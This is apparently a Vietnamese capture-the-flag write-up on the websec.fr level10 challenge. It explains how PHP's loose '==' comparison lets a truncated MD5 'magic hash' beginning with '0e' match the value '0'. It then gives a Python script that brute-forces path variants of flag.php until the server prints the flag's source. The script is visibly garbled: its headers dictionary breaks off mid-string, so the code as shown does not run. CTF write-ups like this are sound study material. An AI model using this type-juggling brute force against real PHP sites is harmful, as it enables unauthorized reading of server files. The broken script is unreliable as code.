## websec.fr-level10

Hi mọi người, đây là bài public writeup đầu tiên của mình :D
Chủ đề của bài viết này chính là challenge level10 của websec.fr

Khi truy cập vào challenge, ta được cung cấp source của file index.php.

```php
<?php
        if (isset ($_REQUEST['f']) && isset ($_REQUEST['hash'])) {
            $file = $_REQUEST['f'];
            $request = $_REQUEST['hash'];

            $hash = substr (md5 ($flag . $file . $flag), 0, 8);

            echo '<div class="row"><br><pre>';
            if ($request == $hash) {
            show_source ($file);
            } else {
            echo 'Permission denied!';
            }
            echo '</pre></div>';
        }
  ?>

```

Đầu tiên biến $hash sẽ được gán bởi giá trị của hàm md5().

Biến $hash và $request được so sánh bởi '==', là 'Loose comparision' nên 2 giá trị sẽ được đưa về cùng một kiểu dữ liệu để so sánh. (các bạn có thể tham khảo tại đây: https://www.php.net/manual/en/language.operators.comparison.php)

Nếu giá trị 0e... được tạo ra bởi hàm md5() và được so sánh với với giá trị 0 được gán cho biến $request thì hàm if sẽ trở thành True. Khi đó ta có thể xem được nội dung của file flag.php thông qua hàm show_source().

Vì cách thức hoạt động của md5 khá phức tạp (các bạn có thể tham khảo tại: https://vi.wikipedia.org/wiki/MD5) nên ý nghĩ đầu tiên là brute-force bằng cách chỉnh sửa các giá trị truyền vào hàm md5() đến khi nào có được giá trị 0e... :D

Ta có liên tục thêm './' vào trước 'flag.php' thông qua param 'f' của biến $_REQUEST['f'] đến khi nào ra được giá trị mong muốn. Nhưng nếu làm thế sẽ tăng độ dài của tham số truyền vào và vượt mức cho phép của Apache nên ta có thể thay thế bằng "." + "/"*i + "flag.php"

Mình sẽ viết script để exploit bằng python

```python
import requests

burp0_url = "https://websec.fr:443/level10/index.php"
burp0_headers = {"Cache-Control": "max-age=0", "Sec-Ch-Ua": "\"Not;A=Brand\";v=\"99\", \"Chromium\";v=\"106\"", "Sec-Ch-Ua-Mobile": ">
filename = "flag.php"
i = 1
while True:
     burp0_data = {"f":filename, "hash": "0"}
     r = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
     if "Permission denied!" not in r.text:
          print(r.text)
          break
     else:
          print("Test: ", i)
     filename = "." + "/"*i + "flag.php"
     i = i + 1

```

Brute-force sẽ hơi mất nhiều thời gian, nhưng chờ đợi là hạnh phúc :DD


Nếu có mình có sai sót gì về kiến thức hay bất kỳ vấn đề gì, xin hãy đóng góp qua mail: dangth2002@gmail.com. 

